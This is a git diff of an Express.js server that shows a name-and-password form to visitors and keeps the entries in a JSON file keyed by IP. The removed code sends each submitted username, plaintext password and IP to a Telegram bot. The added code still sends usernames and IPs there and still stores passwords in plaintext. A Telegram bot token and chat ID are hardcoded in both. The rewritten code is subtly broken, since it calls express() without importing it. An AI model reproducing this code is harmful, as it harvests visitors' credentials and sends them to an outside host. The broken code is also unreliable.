@@ -1,91 +1,98 @@
-import express from "express";
-import bodyParser from "body-parser";
-import fs from "fs";
-import path from "path";
-import requestIp from "request-ip";
-import axios from "axios";
+
+import fs from 'fs';
+import path from 'path';
+import bodyParser from 'body-parser';
+import axios from 'axios';
 
 const app = express();
-const PORT = process.env.PORT || 3000;
-const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8';
-const TELEGRAM_CHAT_ID = '5901409601';
-const DATA_FILE = path.join(__dirname, "users.json");
+const port = process.env.PORT || 3000;
+const DATA_FILE = path.join(path.dirname(import.meta.url), 'users.json');  // Path to users.json
 
-app.set("view engine", "ejs");
-app.use(express.static("public"));
 app.use(bodyParser.urlencoded({ extended: true }));
-app.use(requestIp.mw());
+app.set('view engine', 'ejs');
 
-// **User Data Load Function**
-const loadUsers = () => {
-    if (!fs.existsSync(DATA_FILE)) return {};
-    return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
-};
-
-// **Save User Data Function**
-const saveUsers = (data) => {
-    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
-};
-
-// **Homepage - Login Check**
-app.get("/", (req, res) => {
-    const users = loadUsers();
-    const userIP = req.clientIp;
-
-    if (users[userIP]) {
-        // Agar IP already exist hai to direct login karega
-        return res.redirect("/dashboard");
+// Function to read users data from the users.json file
+function readUserData() {
+    try {
+        const data = fs.readFileSync(DATA_FILE, 'utf8');
+        return JSON.parse(data);
+    } catch (error) {
+        return [];  // Return empty array if file is not found or has issues
     }
+}
 
-    res.render("name");
+// Function to write users data to the users.json file
+function writeUserData(users) {
+    try {
+        fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2), 'utf8');
+    } catch (error) {
+        console.error('Error writing to file', error);
+    }
+}
+
+// Home route to ask for user's name
+app.get('/', (req, res) => {
+    res.render('name');
 });
 
-// **Save User Data and Send to Telegram**
-app.post("/save-name", async (req, res) => {
+// Save user name and password
+app.post('/save-name', (req, res) => {
     const { userName, password } = req.body;
-    const userIP = req.clientIp;
-    const users = loadUsers();
+    const ip = req.ip;  // Get user IP address
 
-    users[userIP] = { userName, password };
-    saveUsers(users);
+    // Read existing users from the file
+    const users = readUserData();
 
-    // Send user info to Telegram bot
-    const message = `New User Registered:
-👤 Name: ${userName}
-🔑 Password: ${password}
-🌍 IP: ${userIP}`;
-    
-    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    // Check if the user with this IP already exists
+    const existingUser = users.find(user => user.ip === ip);
+
+    if (existingUser) {
+        // If user exists, login with the existing password
+        if (existingUser.password === password) {
+            // Send data to Telegram bot
+            sendToTelegram(`User logged in: ${userName} with IP: ${ip}`);
+            return res.redirect('/search');
+        } else {
+            return res.status(401).send('Incorrect password');
+        }
+    } else {
+        // If no user exists with this IP, create a new entry
+        users.push({
+            ip,
+            userName,
+            password
+        });
+
+        // Save updated user data
+        writeUserData(users);
+
+        // Send data to Telegram bot
+        sendToTelegram(`New user registered: ${userName} with IP: ${ip}`);
+
+        return res.redirect('/search');
+    }
+});
+
+// Function to send messages to Telegram bot
+function sendToTelegram(message) {
+    const TELEGRAM_BOT_TOKEN = '7981577790:AAHhoGXjXGj2UCRKsSHWKXkAWH-HlKhiNk8';
+const TELEGRAM_CHAT_ID = '5901409601';
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    axios.post(url, {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
+    })
+    .then(response => {
+        console.log('Message sent to Telegram:', response.data);
+    })
+    .catch(error => {
+        console.error('Error sending message to Telegram:', error);
     });
+}
 
-    res.redirect("/dashboard");
+// Start the server
+app.listen(port, () => {
+    console.log(`Server is running on http://localhost:${port}`);
 });
-
-// **Forget Password - Delete Old Data**
-app.post("/forget", (req, res) => {
-    const userIP = req.clientIp;
-    const users = loadUsers();
-
-    if (users[userIP]) {
-        delete users[userIP];
-        saveUsers(users);
-    }
-
-    res.redirect("/");
-});
-
-// **Dashboard - Logged In Users**
-app.get("/dashboard", (req, res) => {
-    const users = loadUsers();
-    const userIP = req.clientIp;
-
-    if (!users[userIP]) {
-        return res.redirect("/");
-    }
-
-    res.render("dashboard", { userName: users[userIP].userName });
-});
-
-app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
